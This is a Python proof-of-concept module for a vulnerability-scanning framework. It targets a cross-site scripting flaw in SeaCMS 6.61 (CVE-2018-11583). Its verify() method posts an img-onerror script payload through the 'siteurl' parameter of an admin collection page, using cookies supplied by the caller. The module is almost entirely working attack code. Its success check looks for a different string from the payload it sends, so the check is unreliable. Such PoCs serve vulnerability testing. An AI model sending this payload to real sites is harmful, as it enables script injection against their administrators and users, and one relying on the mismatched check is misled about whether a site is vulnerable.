# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'SEACMS_0007_L'  # 平台漏洞编号，留空
    name = 'SeaCMS跨站脚本漏洞'  # 漏洞名称
    level = VulnLevel.MED  # 漏洞危害级别
    type = VulnType.XSS  # 漏洞类型
    disclosure_date = '2018-05-31'  # 漏洞公布时间
    desc = '''
        SeaCMS是一套使用PHP编写的免费、开源的网站内容管理系统。该系统主要被设计用来管理视频点播资源。
        SeaCMS 6.61版本中存在跨站脚本漏洞。远程攻击者可借助‘siteurl’参数利用该漏洞注入任意的Web脚本或HTML。 
    '''  # 漏洞描述
    ref = 'http://www.cnvd.org.cn/flaw/show/CNVD-2018-11246'  # 漏洞来源
    cnvd_id = 'CNVD-2018-11246'  # cnvd漏洞编号
    cve_id = 'CVE-2018-11583'  # cve编号
    product = 'SEACMS(海洋CMS)'  # 漏洞应用名称
    product_version = '6.61'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '4a1b9e6d-5239-4f22-a814-7597c79abd5f'
    author = '47bwy'  # POC编写者
    create_date = '2018-07-20'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                },
                'cookies': {
                    'type': 'string',
                    'description': 'cookies',
                    'default': 'bid=111;uid=222',
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # 首先登录用户。获取cookies
            s = requests.session()
            cookies = {}
            raw_cookies = self.get_option('cookies')
            for line in raw_cookies.split(';'):
                key, value = line.split('=', 1)  # 1代表只分一次，得到两个数据
                cookies[key] = value

            # 验证漏洞
            payload = '/upload/houtai/admin_collect.php?action=addrule'
            url = self.target + payload
            headers = {
                'Referer': '%s&id=3' % (payload),
                'Content-Type': 'application/x-www-form-urlencoded'
            }
            data = "step=2&id=3&itemname=11&intodatabase=0&getherday=0&siteurl=aaa%22%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E \
                    &coding=gb2312&playfrom=&downfrom=&autocls=0&classid=0&inithit=0&pageset=0&pageurl0=&pageurl1=&istart=1&iend=1 \
                    &pageurl2=&Submit=%E4%BF%9D%E5%AD%98%E4%BF%A1%E6%81%AF%E5%B9%B6%E8%BF%9B%E5%85%A5%E4%B8%8B%E4%B8%80%E6%AD%A5%E8%AE%BE%E7%BD%AE"
            self.output.info('正在尝试XSS请求')
            r = s.post(url, headers=headers, cookies=cookies, data=data)

            if '<script>alert(1)</script>' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
